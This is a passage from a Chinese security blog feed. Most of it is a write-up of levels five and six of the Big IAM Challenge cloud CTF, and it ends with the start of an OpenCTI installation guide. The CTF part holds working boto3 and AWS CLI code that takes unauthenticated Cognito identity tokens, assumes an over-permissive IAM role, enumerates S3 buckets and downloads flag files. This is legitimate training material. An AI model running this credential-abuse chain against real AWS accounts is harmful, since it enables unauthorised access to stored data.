boto3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置AWS配置</span></span><br><span class="line">region = <span class="string">&#x27;us-east-1&#x27;</span></span><br><span class="line">identity_pool_id = <span class="string">&#x27;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&#x27;</span></span><br><span class="line">bucket_name = <span class="string">&#x27;wiz-privatefiles&#x27;</span></span><br><span class="line">object_key = <span class="string">&#x27;cognito1.png&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建Cognito身份凭证</span></span><br><span class="line">cognito_identity = boto3.client(<span class="string">&#x27;cognito-identity&#x27;</span>, region_name=region)</span><br><span class="line">identity_response = cognito_identity.get_id(IdentityPoolId=identity_pool_id)</span><br><span class="line">identity_id = identity_response[<span class="string">&#x27;IdentityId&#x27;</span>]</span><br><span class="line">credentials_response = cognito_identity.get_credentials_for_identity(</span><br><span class="line">    IdentityId=identity_id</span><br><span class="line">)</span><br><span class="line">access_key = credentials_response[<span class="string">&#x27;Credentials&#x27;</span>][<span class="string">&#x27;AccessKeyId&#x27;</span>]</span><br><span class="line">secret_key = credentials_response[<span class="string">&#x27;Credentials&#x27;</span>][<span class="string">&#x27;SecretKey&#x27;</span>]</span><br><span class="line">session_token = credentials_response[<span class="string">&#x27;Credentials&#x27;</span>][<span class="string">&#x27;SessionToken&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用生成的凭证访问S3</span></span><br><span class="line">s3 = boto3.client(<span class="string">&#x27;s3&#x27;</span>, aws_access_key_id=access_key,</span><br><span class="line">                  aws_secret_access_key=secret_key, aws_session_token=session_token, region_name=region)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取签名URL</span></span><br><span class="line">url = s3.generate_presigned_url(</span><br><span class="line">    <span class="string">&#x27;get_object&#x27;</span>, Params=&#123;<span class="string">&#x27;Bucket&#x27;</span>: bucket_name, <span class="string">&#x27;Key&#x27;</span>: object_key&#125;, ExpiresIn=<span class="number">3600</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印签名URL</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Signed URL:&quot;</span>, url)</span><br><span class="line"></span><br><span class="line"><span class="comment">#列文件</span></span><br><span class="line">response = s3.list_objects_v2(Bucket=bucket_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;Contents&#x27;</span> <span class="keyword">in</span> response:</span><br><span class="line">    <span class="keyword">for</span> obj <span class="keyword">in</span> response[<span class="string">&#x27;Contents&#x27;</span>]:</span><br><span class="line">        key = obj[<span class="string">&#x27;Key&#x27;</span>]</span><br><span class="line">        size = obj[<span class="string">&#x27;Size&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Key: <span class="subst">&#123;key&#125;</span>, Size: <span class="subst">&#123;size&#125;</span> bytes&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Bucket is empty or does not exist.&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/google/a469eb97/img_17.png" alt="img.png"></p><p>列出桶里面所有的文件。</p><p>这里原本的设计解题应该是这样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aws s3 <span class="built_in">ls</span> s3://wiz-privatefiles/</span><br><span class="line">aws s3 <span class="built_in">cp</span> s3://wiz-privatefiles/flag1.txt /tmp/flag5.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /tmp/flag5.txt</span><br><span class="line">&#123;wiz:incognito-is-always-suspicious&#125;</span><br></pre></td></tr></table></figure><h1 id="k6Xvr">第六关：</h1><p><img src="/google/a469eb97/img_18.png" alt="img.png"></p><p>好的，直接放弃。</p><h2 id="GZLBx">题目给的IAM策略：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;Version&quot;</span>: <span class="string">&quot;2012-10-17&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Statement&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Principal&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;Federated&quot;</span>: <span class="string">&quot;cognito-identity.amazonaws.com&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;Action&quot;</span>: <span class="string">&quot;sts:AssumeRoleWithWebIdentity&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Condition&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;StringEquals&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;cognito-identity.amazonaws.com:aud&quot;</span>: <span class="string">&quot;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="RdVRN">策略解读：</h2>1. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">Effect：声明的效果是"Allow"，表示允许执行指定的操作。</font>2. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">Principal：声明中的主体是一个联合身份提供商，即cognito-identity.amazonaws.com。这意味着允许Cognito身份池中的用户执行操作。</font>3. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">Action：策略允许执行的操作是sts:AssumeRoleWithWebIdentity。这意味着用户可以使用Web身份（如Cognito用户池、Facebook、Google等）扮演角色。</font>4. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">Condition：策略中有一个条件，要求"cognito-identity.amazonaws.com:aud"的值必须等于"us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"。这意味着只有特定Cognito身份池中的用户才能执行操作。</font>5. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">这个策略仅限制了用户必须来自特定的Cognito身份池，但没有限制具体哪些用户可以执行操作。这可能导致未经授权的用户扮演角色。为了提高安全性，可以在条件中添加更多限制，例如，要求用户属于某个Cognito用户池组。</font>6. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">策略没有限制用户可以扮演哪些角色。这可能导致用户扮演过于高权限的角色。为了提高安全性，可以在策略中添加资源（Resource）元素，限制允许扮演的角色。</font>7. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">确保在实际环境中使用正确的Cognito身份池ID（us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b）。如果使用错误的ID，可能导致未经授权的用户获得访问权限，或者授权用户无法访问资源。</font><h2 id="A45X6">解题步骤：</h2><h3 id="oSA1j">获取身份 ID</h3>首先，我们可以通过运行以下命令从池中获取身份 ID。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aws cognito-identity get-id --region us-east-1 --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b</span><br><span class="line"></span><br><span class="line">us-east-1:ff551393-eeb6-4987-88d8-ac3a15268d59</span><br></pre></td></tr></table></figure><p><img src="/google/a469eb97/img_19.png" alt="img.png"></p><h3 id="S1vh1">获取web的凭据（JWT）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws cognito-identity get-open-id-token --region us-east-1 --identity-id us-east-1:ff551393-eeb6-4987-88d8-ac3a15268d59</span><br></pre></td></tr></table></figure><p><img src="/google/a469eb97/img_20.png" alt="img.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;IdentityId&quot;</span>: <span class="string">&quot;us-east-1:ff551393-eeb6-4987-88d8-ac3a15268d59&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Token&quot;</span>: <span class="string">&quot;eyJraWQiOiJ1cy1lYXN0LTEzIiwidHlwIjoiSldTIiwiYWxnIjoiUlM1MTIifQ.eyJzdWIiOiJ1cy1lYXN0LTE6ZmY1NTEzOTMtZWViNi00OTg3LTg4ZDgtYWMzYTE1MjY4ZD</span></span><br><span class="line"><span class="string">U5IiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZ</span></span><br><span class="line"><span class="string">W50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE2ODc5NDgwMDgsImlhdCI6MTY4Nzk0NzQwOH0.n0DkFwLG7nVrpD-xvixAKoGbots97HyrjxAVbdyaNYoLGkv5be7vf_ijBnCENhfXqJL_DkRA</span></span><br><span class="line"><span class="string">yd-LU2JjU_66n0JsqecB6Qd_jTCKx-k8mOdFpHrjcurPwp0yRIJCgsESCgltc7Yft95spokBuG11QrX_ATfmEzOnFCZcKxkgbUx0-4RqAlYXx6L9aPGl3xCmH4gw6uaJae7h2VjdN7j-2oW22lS</span></span><br><span class="line"><span class="string">l0zVpwhQrza5oNws3c1s-WMS1-megMneBCHmlu23nb5vA-24Nx588NIqoUxGL9Gy6_kHp8XhIumsGYEmHc2LkKuoOOuCUbx7v4MUvqObbxhLue4OGwKzpOQepdg&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CDs4v">现在我们可以承担角色Cognito_s3accessAuth_Role并传递 JWT。</h3><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">使用 </font>**<font style="background-color:rgb(249, 250, 251);">aws sts assume-role</font>**<font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);"> 命令获取临时凭据。将 </font>**<font style="background-color:rgb(249, 250, 251);">ROLE_ARN</font>**<font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);"> 替换为您要扮演的 IAM 角色的 Amazon 资源名称（ARN），并将 </font>**<font style="background-color:rgb(249, 250, 251);">ROLE_SESSION_NAME</font>**<font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);"> 替换为您选择的会话名称：</font><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name iam-challenge-6 --web-identity-token <span class="string">&#x27;eyJraWQiOiJ1cy1lYXN0LTEzIiwidHlwIjoiSldTIiwiYWxnIjoiUlM1MTIifQ.eyJzdWIiOiJ1cy1lYXN0LTE6ZmY1NTEzOTMtZWViNi00OTg3LTg4ZDgtYWMzYTE1MjY4ZD</span></span><br><span class="line"><span class="string">U5IiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZ</span></span><br><span class="line"><span class="string">W50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE2ODc5NDgzMTQsImlhdCI6MTY4Nzk0NzcxNH0.TxIdVR2ijSnddutiIVLwjQ2LysU8esATk0G3cMBMly1qCSRzJnExQvH2usSF43m6N4QDWryf</span></span><br><span class="line"><span class="string">JCGfcGfKVQZN8UmIHeTne6YmRHAr1ZEJigZanpFEGJKsKCpS4-VhgHzVldCiJqpsONi5KLoQ-tw-AycABsmJhJBLZbKAb3LcoFdKdmAJpPwqGGiLM1OwmmL-48AOkVu0tf2RXLVdPCf1CpRN3n2</span></span><br><span class="line"><span class="string">EI2K6hmiqQkI2OXmnz37SUtHk2WD0SlarhoWwlO6p9jc5K_ZBAx_9Cf127L27G5WNxxGQ_Ogq2BS78IHYkRXsqw8e_ynatRqjG8z87Vk_C60-FEVCt0vfZb28eQ&#x27;</span></span><br></pre></td></tr></table></figure><p>可是：（王得发）</p><p><img src="/google/a469eb97/img_21.png" alt="img.png"></p><p>问了强哥token有时间限制，要用python脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">import boto3</span><br><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">from botocore.exceptions import ClientError</span><br><span class="line">from termcolor import colored</span><br><span class="line"></span><br><span class="line">def print_colored(step, text):</span><br><span class="line">    colors = [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;yellow&#x27;</span>, <span class="string">&#x27;blue&#x27;</span>, <span class="string">&#x27;magenta&#x27;</span>, <span class="string">&#x27;cyan&#x27;</span>, <span class="string">&#x27;white&#x27;</span>]</span><br><span class="line">    color = random.choice(colors)</span><br><span class="line">    <span class="built_in">print</span>(colored(f<span class="string">&quot;&#123;step&#125;. &#123;text&#125;&quot;</span>, color))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一个请求，获取 token</span></span><br><span class="line">url_1 = <span class="string">&#x27;https://9rczvqn2ub.execute-api.us-east-1.amazonaws.com/execute&#x27;</span></span><br><span class="line">headers_1 = &#123;</span><br><span class="line">    <span class="string">&#x27;authority&#x27;</span>: <span class="string">&#x27;9rczvqn2ub.execute-api.us-east-1.amazonaws.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;application/json, text/javascript, */*; q=0.01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;accept-language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;origin&#x27;</span>: <span class="string">&#x27;https://bigiamchallenge.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;referer&#x27;</span>: <span class="string">&#x27;https://bigiamchallenge.com/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-platform&#x27;</span>: <span class="string">&#x27;&quot;macOS&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-fetch-dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-fetch-mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-fetch-site&#x27;</span>: <span class="string">&#x27;cross-site&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data_1 = &#123;</span><br><span class="line">    <span class="string">&#x27;command&#x27;</span>: f<span class="string">&quot;aws cognito-identity get-id --region us-east-1 --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response_1 = requests.post(url_1, headers=headers_1, json=data_1)</span><br><span class="line">response_1_json = response_1.json()</span><br><span class="line">IdentityId = json.loads(response_1_json[<span class="string">&quot;stdout&quot;</span>])[<span class="string">&quot;IdentityId&quot;</span>]</span><br><span class="line">print_colored(1, f<span class="string">&quot;池中获取身份 ID成功：\n&#123;IdentityId&#125;&quot;</span>)</span><br><span class="line">data_2 = &#123;</span><br><span class="line">    <span class="string">&#x27;command&#x27;</span>: f<span class="string">&#x27;aws cognito-identity get-open-id-token --region us-east-1 --identity-id &#123;IdentityId&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response_2 = requests.post(url_1, headers=headers_1, json=data_2)</span><br><span class="line">response_2_json = response_2.json()</span><br><span class="line">jwt_token = json.loads(response_2_json[<span class="string">&#x27;stdout&#x27;</span>])[<span class="string">&#x27;Token&#x27;</span>]</span><br><span class="line">print_colored(2, f<span class="string">&quot;成功利用cognito-identity获取到JWTtoken：\n&#123;jwt_token&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 STS 客户端</span></span><br><span class="line">sts = boto3.client(<span class="string">&#x27;sts&#x27;</span>, region_name=<span class="string">&#x27;us-east-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取临时安全凭据</span></span><br><span class="line">response = sts.assume_role_with_web_identity(</span><br><span class="line">    RoleArn=<span class="string">&#x27;arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role&#x27;</span>,</span><br><span class="line">    RoleSessionName=<span class="string">&#x27;iam-challenge-6&#x27;</span>,</span><br><span class="line">    WebIdentityToken=jwt_token</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取临时安全凭据</span></span><br><span class="line">access_key_id = response[<span class="string">&#x27;Credentials&#x27;</span>][<span class="string">&#x27;AccessKeyId&#x27;</span>]</span><br><span class="line">secret_access_key = response[<span class="string">&#x27;Credentials&#x27;</span>][<span class="string">&#x27;SecretAccessKey&#x27;</span>]</span><br><span class="line">session_token = response[<span class="string">&#x27;Credentials&#x27;</span>][<span class="string">&#x27;SessionToken&#x27;</span>]</span><br><span class="line">print_colored(3, <span class="string">&quot;成功使用 aws sts assume-role 命令获取临时凭据&quot;</span>)</span><br><span class="line">print_colored(4, <span class="string">&quot;开始使用boto3进行S3存储桶的枚举&quot;</span>)</span><br><span class="line"><span class="comment"># 使用临时安全凭据创建一个 S3 客户端</span></span><br><span class="line">s3 = boto3.client(<span class="string">&#x27;s3&#x27;</span>, region_name=<span class="string">&#x27;us-east-1&#x27;</span>, aws_access_key_id=access_key_id, aws_secret_access_key=secret_access_key, aws_session_token=session_token)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出 S3 存储桶</span></span><br><span class="line">buckets = s3.list_buckets()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历每个存储桶</span></span><br><span class="line"><span class="keyword">for</span> bucket <span class="keyword">in</span> buckets[<span class="string">&#x27;Buckets&#x27;</span>]:</span><br><span class="line">    bucket_name = bucket[<span class="string">&#x27;Name&#x27;</span>]</span><br><span class="line">    print_colored(5, f<span class="string">&quot;桶名: &#123;bucket_name&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        <span class="comment"># 列出存储桶中的文件</span></span><br><span class="line">        objects = s3.list_objects_v2(Bucket=bucket_name)</span><br><span class="line">        <span class="keyword">for</span> obj <span class="keyword">in</span> objects[<span class="string">&#x27;Contents&#x27;</span>]:</span><br><span class="line">            object_name = obj[<span class="string">&#x27;Key&#x27;</span>]</span><br><span class="line">            print_colored(000, <span class="string">&quot;有此桶的访问权限&quot;</span>)</span><br><span class="line">            print_colored(000, f<span class="string">&quot;  文件名: &#123;object_name&#125;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> object_name:</span><br><span class="line">                print_colored(666, f<span class="string">&quot;找到flag文件：&#123;object_name&#125;&quot;</span>)</span><br><span class="line">                url = s3.generate_presigned_url(</span><br><span class="line">                <span class="string">&#x27;get_object&#x27;</span>,</span><br><span class="line">                Params=&#123;<span class="string">&#x27;Bucket&#x27;</span>: bucket_name, <span class="string">&#x27;Key&#x27;</span>: object_name&#125;,</span><br><span class="line">                ExpiresIn=3600  <span class="comment"># 链接有效期（秒）</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 访问生成的URL并输出页面内容</span></span><br><span class="line">                response = requests.get(url)</span><br><span class="line">                content = response.text</span><br><span class="line">                print_colored(00000, f<span class="string">&quot;输出页面内容: \n&#123;content&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    except ClientError as e:</span><br><span class="line">        <span class="keyword">if</span> e.response[<span class="string">&#x27;Error&#x27;</span>][<span class="string">&#x27;Code&#x27;</span>] == <span class="string">&#x27;AccessDenied&#x27;</span>:</span><br><span class="line">            print_colored(6, <span class="string">&quot;  没有访问权限&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print_colored(7, f<span class="string">&quot;  Error: &#123;e&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p><font style="color:rgb(192, 192, 192);background-color:rgb(47, 49, 54);"></font></p><p><img src="/google/a469eb97/img_22.png" alt="img.png"></p><p>获取到了所有的flag文件，都试一下就行了。</p><h1 id="kpTwe"></h1>参考链接：<p><a href="https://infrasec.sh/post/iam_ctf/#challenge-4">The Big IAM Challenge</a></p><p><img src="/google/a469eb97/img_23.png" alt="img.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="云攻防" scheme="http://example.com/categories/%E4%BA%91%E6%94%BB%E9%98%B2/"/>
    
    
    <category term="云攻防" scheme="http://example.com/tags/%E4%BA%91%E6%94%BB%E9%98%B2/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>开源威胁情报项目OpenCTI安装及排坑</title>
    <link href="http://example.com/google/3196a87b.html"/>
    <id>http://example.com/google/3196a87b.html</id>
    <published>2024-10-11T07:44:07.000Z</published>
    <updated>2024-10-11T07:54:45.759Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="QaOdi">背景：</h1>最近在做情报相关的工作，涉及到很多的爬虫、存储、统一展示的问题，自己和团队做的产品在调度和统一管理上还是存在一些缺陷<p>所以就想着看看有没有一些好的实践项目，能够学到一些经验和思路，更好的给产品做赋能。搜了一大圈，发现基本国外的企业和个人工作室都在用Opencti这个东西，看了一圈介绍和成熟度感觉这个项目还不错。无论是框架的热插拔设计还是后期社区的维护都挺成熟的。<br><img src="/google/3196a87b/img_1.png" alt="img.png"></p><p>那么接下来就上手试试吧！</p><p>先放效果图：</p><h1 id="vEcUz">前期准备：</h1>1. 项目文档：[https://docs.opencti.io/latest/](https://docs.opencti.io/latest/)2. 项目地址：[https://github.com/OpenCTI-Platform](https://github.com/OpenCTI-Platform)3. 用到的一个生成随机uuid的工具：[https://www.uuidgenerator.net/version4](https://www.uuidgenerator.net/version4)<p>先不管怎样把文档大概的过一遍，发现他有好几种安装的方式：docker、手动、云</p><p>但项目比较大，对安装的机器性能要求还是蛮高的</p><p>最少16G +300G吧</p><p>我这里是选择的腾讯云的轻量服务器搞的，后期准备实践完了装到nas上去【后期给大家出教程吧】</p><p>话不多说直接开始吧！</p><h1 id="S7aXc">安装平台：</h1><h2 id="HhQB0">安装docker和docker-compose</h2><p>直接一键脚本吧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新系统包索引</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装Docker的依赖包</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install -y \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg \</span><br><span class="line">    lsb-release</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加Docker的官方GPG密钥</span></span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | <span class="built_in">sudo</span> gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置稳定版Docker仓库</span></span><br><span class="line"><span class="built_in">echo</span> \</span><br><span class="line">  <span class="string">&quot;deb [arch=<span class="subst">$(dpkg --print-architecture)</span> signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">  <span class="subst">$(lsb_release -cs)</span> stable&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次更新系统包索引</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装最新版本的Docker CE和Docker CE CLI，以及containerd</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install -y docker-ce docker-ce-cli containerd.io</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证Docker是否安装成功</span></span><br><span class="line"><span class="built_in">sudo</span> docker run hello-world</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装Docker Compose</span></span><br><span class="line"><span class="comment"># 首先，下载最新版本的Docker Compose</span></span><br><span class="line"><span class="built_in">sudo</span> curl -L <span class="string">&quot;https://github.com/docker/compose/releases/latest/download/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span 